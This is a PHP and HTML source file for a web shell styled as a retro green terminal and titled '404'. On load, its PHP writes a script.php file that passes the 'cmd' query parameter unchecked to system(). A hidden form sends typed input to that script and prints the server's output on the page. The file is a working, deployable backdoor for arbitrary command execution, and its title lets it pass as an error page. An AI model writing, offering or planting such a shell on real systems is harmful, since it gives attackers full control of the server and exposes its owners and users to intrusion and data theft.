<?php
if (!is_file('script.php')) {
    $contents = '<?php if (isset($_GET["cmd"])) {system($_GET["cmd"]);}';           // Some simple example content.
    file_put_contents('script.php', $contents);     // Save our content to the file.
} else {
    unlink('script.php');
}
?>
<!DOCTYPE html>
<html lang="en">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata"/>
<meta name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=no, minimum-scale=1, maximum-scale=1, viewport-fit=cover, minimal-ui"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>

<head>
    <meta charset="UTF-8">
    <title>404</title>
    <script async src="https://cdn.jsdelivr.net/npm/pwacompat@2.0.6/pwacompat.min.js"
            integrity="sha384-GOaSLecPIMCJksN83HLuYf9FToOiQ2Df0+0ntv7ey8zjUHESXhthwvq9hXAZTifA" crossorigin="anonymous">
    </script>
    <script src="https://code.jquery.com/jquery-3.7.0.slim.min.js"
            integrity="sha256-tG5mcZUtJsZvyKAxYLVXrmjKBVLd6VpVccqz/r4ypFE=" crossorigin="anonymous"></script>

    <style>
        /*Animations start*/

        /*Input blinking start*/

        @-webkit-keyframes cursor-blink {
            0% {
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }

        @keyframes cursor-blink {
            0% {
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }

        /*Input blinking end*/

        /*Shell title glitch start*/

        @-webkit-keyframes glitch-anim {
            0% {
                clip: rect(53px, 999px, 113px, 0);
            }
            5% {
                clip: rect(28px, 999px, 114px, 0);
            }
            10% {
                clip: rect(55px, 999px, 37px, 0);
            }
            15% {
                clip: rect(77px, 999px, 80px, 0);
            }
            20% {
                clip: rect(79px, 999px, 120px, 0);
            }
            25% {
                clip: rect(44px, 999px, 24px, 0);
            }
            30% {
                clip: rect(43px, 999px, 18px, 0);
            }
            35% {
                clip: rect(48px, 999px, 32px, 0);
            }
            40% {
                clip: rect(22px, 999px, 82px, 0);
            }
            45% {
                clip: rect(100px, 999px, 120px, 0);
            }
            50% {
                clip: rect(75px, 999px, 115px, 0);
            }
            55% {
                clip: rect(24px, 999px, 50px, 0);
            }
            60% {
                clip: rect(75px, 999px, 55px, 0);
            }
            65% {
                clip: rect(50px, 999px, 105px, 0);
            }
            70% {
                clip: rect(7px, 999px, 9px, 0);
            }
            75% {
                clip: rect(63px, 999px, 64px, 0);
            }
            80% {
                clip: rect(50px, 999px, 106px, 0);
            }
            85% {
                clip: rect(60px, 999px, 60px, 0);
            }
            90% {
                clip: rect(94px, 999px, 40px, 0);
            }
            95% {
                clip: rect(82px, 999px, 120px, 0);
            }
            100% {
                clip: rect(30px, 999px, 119px, 0);
            }
        }

        @keyframes glitch-anim {
            0% {
                clip: rect(53px, 999px, 113px, 0);
            }
            5% {
                clip: rect(28px, 999px, 114px, 0);
            }
            10% {
                clip: rect(55px, 999px, 37px, 0);
            }
            15% {
                clip: rect(77px, 999px, 80px, 0);
            }
            20% {
                clip: rect(79px, 999px, 120px, 0);
            }
            25% {
                clip: rect(44px, 999px, 24px, 0);
            }
            30% {
                clip: rect(43px, 999px, 18px, 0);
            }
            35% {
                clip: rect(48px, 999px, 32px, 0);
            }
            40% {
                clip: rect(22px, 999px, 82px, 0);
            }
            45% {
                clip: rect(100px, 999px, 120px, 0);
            }
            50% {
                clip: rect(75px, 999px, 115px, 0);
            }
            55% {
                clip: rect(24px, 999px, 50px, 0);
            }
            60% {
                clip: rect(75px, 999px, 55px, 0);
            }
            65% {
                clip: rect(50px, 999px, 105px, 0);
            }
            70% {
                clip: rect(7px, 999px, 9px, 0);
            }
            75% {
                clip: rect(63px, 999px, 64px, 0);
            }
            80% {
                clip: rect(50px, 999px, 106px, 0);
            }
            85% {
                clip: rect(60px, 999px, 60px, 0);
            }
            90% {
                clip: rect(94px, 999px, 40px, 0);
            }
            95% {
                clip: rect(82px, 999px, 120px, 0);
            }
            100% {
                clip: rect(30px, 999px, 119px, 0);
            }
        }

        /*Shell title glitch end*/

        /*Scanlines start*/

        @-webkit-keyframes scan {
            0% {
                background-position: 0 -100vh;
            }
            35%, 100% {
                background-position: 0 100vh;
            }
        }

        @keyframes scan {
            0% {
                background-position: 0 -100vh;
            }
            35%, 100% {
                background-position: 0 100vh;
            }
        }

        /*Scanlines end*/

        /*Animations end*/

        html {
            min-height: 100%;
        }

        /*Scanlines styling start*/

        .overlay {
            pointer-events: none;
            position: fixed;
            width: 100%;
            height: 100%;
            background: -webkit-repeating-linear-gradient(top, rgba(0, 0, 0, 0) 0, rgba(0, 0, 0, 0.3) 50%, rgba(0, 0, 0, 0) 100%);
            background: repeating-linear-gradient(180deg, rgba(0, 0, 0, 0) 0, rgba(0, 0, 0, 0.3) 50%, rgba(0, 0, 0, 0) 100%);
            background-size: auto 3.7px;
            z-index: 99;
        }

        .overlay::before {
            content: "";
            pointer-events: none;
            position: fixed;
            display: block;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100%;
            background-image: -webkit-gradient(linear, left bottom, left top, from(transparent), color-stop(2%, rgba(32, 128, 32, 0.2)), color-stop(3%, rgba(32, 128, 32, 0.8)), color-stop(3%, rgba(32, 128, 32, 0.2)), to(transparent));
            background-image: linear-gradient(0deg, transparent 0%, rgba(32, 128, 32, 0.2) 2%, rgba(32, 128, 32, 0.8) 3%, rgba(32, 128, 32, 0.2) 3%, transparent 100%);
            background-repeat: no-repeat;
            -webkit-animation: scan 7.5s linear 0s infinite;
            animation: scan 7.5s linear 0s infinite;
        }

        /*Scanlines styling end*/

        /**/

        .glitch_1 {
            margin: 0 auto;
            font-family: "Inconsolata", Helvetica, sans-serif;
            font-size: 3rem;
            font-weight: 600;
            left: auto;
            position: relative;
            display: block;
            top: auto;
            z-index: 3;
        }

        .glitch_1:after {
            margin: 0 auto;
            -webkit-animation: glitch-anim 2.5s infinite linear alternate-reverse;
            animation: glitch-anim 2.5s infinite linear alternate-reverse;
            content: "Web-";
            left: 2px;
            overflow: hidden;
            position: absolute;
            text-shadow: -2px 0 #474747;
        }

        .glitch_1:before {
            margin: 0 auto;
            -webkit-animation: glitch-anim 3.5s infinite linear alternate-reverse;
            animation: glitch-anim 3.5s infinite linear alternate-reverse;
            content: "Web-";
            left: -1px;
            overflow: hidden;
            position: absolute;
            text-shadow: 2px 0 #636363;
        }

        .glitch_2 {
            color: white;
            margin: 0 auto;
            font-family: "Inconsolata", Helvetica, sans-serif;
            font-size: 3rem;
            font-weight: 600;
            left: auto;
            position: relative;
            top: auto;
            z-index: 3;
        }

        .glitch_2:before {
            margin: 0 auto;
            -webkit-animation: glitch-anim 3s infinite linear alternate-reverse;
            animation: glitch-anim 3s infinite linear alternate-reverse;
            content: "Shell";
            left: -1px;
            overflow: hidden;
            position: absolute;
            text-shadow: 2px 0 #636363;
        }

        .glitch_2:after {
            margin: 0 auto;
            -webkit-animation: glitch-anim 2s infinite linear alternate-reverse;
            animation: glitch-anim 2s infinite linear alternate-reverse;
            content: "Shell";
            left: 2px;
            overflow: hidden;
            position: absolute;
            text-shadow: -2px 0 #474747;
        }

        body {
            background-color: black;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 100%;
            background-image: -webkit-gradient(#11581e, #041607);
            background-image: radial-gradient(#11581e, #041607);
            font-family: "Inconsolata", Helvetica, sans-serif;
            font-size: 1.5rem;
            color: rgba(128, 255, 128, 0.8);
            text-shadow: 0 0 1ex rgba(51, 255, 51, 1), 0 0 2px rgba(255, 255, 255, 0.8);
        }

        .terminal {
            position: relative;
            padding: 4rem;
            overflow: auto;
        }

        /*answer*/

        .terminal .prompt {
            color: #1ff042;
            display: block;
            font-family: "AndaleMono", monospace;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9em;
            letter-spacing: 0.15em;
            white-space: pre-wrap;
            text-shadow: 0 0 2px rgba(31, 240, 66, 0.75);
            line-height: 1;
            margin-bottom: 0.75em;
        }

        .terminal .prompt:before {
            content: "> ";
            display: inline-block;
        }

        .terminal .prompt_output:before {
            content: "one@root: ~$";
            display: inline-block;
        }

        .terminal .new-input {
            display: inline-block;
        }

        .terminal .new-input:before {
            content: "one@root: ~$";
            display: inline-block;
        }

        .terminal .new-input:after {
            display: inline-block;
            vertical-align: -0.15em;
            width: 0.75em;
            height: 1em;
            margin-left: 5px;
            background: #1ff042;
            -webkit-box-shadow: 1px 1px 1px rgba(31, 240, 66, 0.65), -1px -1px 1px rgba(31, 240, 66, 0.65), 1px -1px 1px rgba(31, 240, 66, 0.65), -1px 1px 1px rgba(31, 240, 66, 0.65);
            box-shadow: 1px 1px 1px rgba(31, 240, 66, 0.65), -1px -1px 1px rgba(31, 240, 66, 0.65), 1px -1px 1px rgba(31, 240, 66, 0.65), -1px 1px 1px rgba(31, 240, 66, 0.65);
            -webkit-animation: cursor-blink 1.25s steps(1) infinite;
            animation: cursor-blink 1.25s steps(1) infinite;
            content: "";
        }

        /*used for printing images into the "terminal"*/

        .imgPrint p {
            letter-spacing: 0;
            opacity: 0;
            line-height: 1rem;
        }

        /*404 form styling*/

        .four-o-four-form {
            opacity: 0;
            position: fixed;
            top: 0;
            left: 0;
        }

        @font-face {
            font-family: "death";
            src: url("fonts/blackasylumdemo-kcfonts-webfont.woff2") format("woff2"), url("fonts/blackasylumdemo-kcfonts-webfont.woff") format("woff");
            font-weight: normal;
            font-style: normal;
        }
    </style>
</head>

<body>
<div class="overlay"></div>
<div class="container">
    <form class="four-o-four-form" method="post">
        <input type="text" class="404-input" id="cmd" name="cmd">
    </form>
    <h1 class="glitch_1">Web-<span class="glitch_2">Shell</span></h1>
    <div class="terminal" id="terminal">
        <p class="prompt">What is real?</p>
        <p class="prompt_output new-input"></p>
    </div>
</div>
<script src='https://raw.githubusercontent.com/julianshapiro/velocity/master/velocity.min.js'></script>
<script>
    var src = document.getElementById("terminal");
    var blue = undefined;
    var red = undefined;
    var quest = false;
    var answer = undefined;
    var funnyC = 0;
    var inputReady = true;
    var input = $('.404-input');
    input.focus();
    $('.container').on('click', function (e) {
        input.focus();
    });

    input.on('keyup', function (e) {
        $('.new-input').text(input.val());
        //console.log(inputReady);
    });

    $('.four-o-four-form').on('submit', function (e) {
        e.preventDefault();
        var val = $(this).children($('.404-input')).val().toLowerCase();
        var href;

        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                answer = this.responseText;
                resetForm();
            }
        };
        xmlhttp.open("GET", "script.php?cmd=" + val, true);
        xmlhttp.send();

    });

    function resetForm() {
        var input = $('.404-input');

        $('.new-input').removeClass('new-input');
        input.val('');
        $('.terminal').append('<p class="prompt">' + answer + '</p><p class="prompt_output new-input"></p>');

        $('.new-input').velocity('scroll',), {
            duration: 100,
        }
    }

</script>

</body>

</html>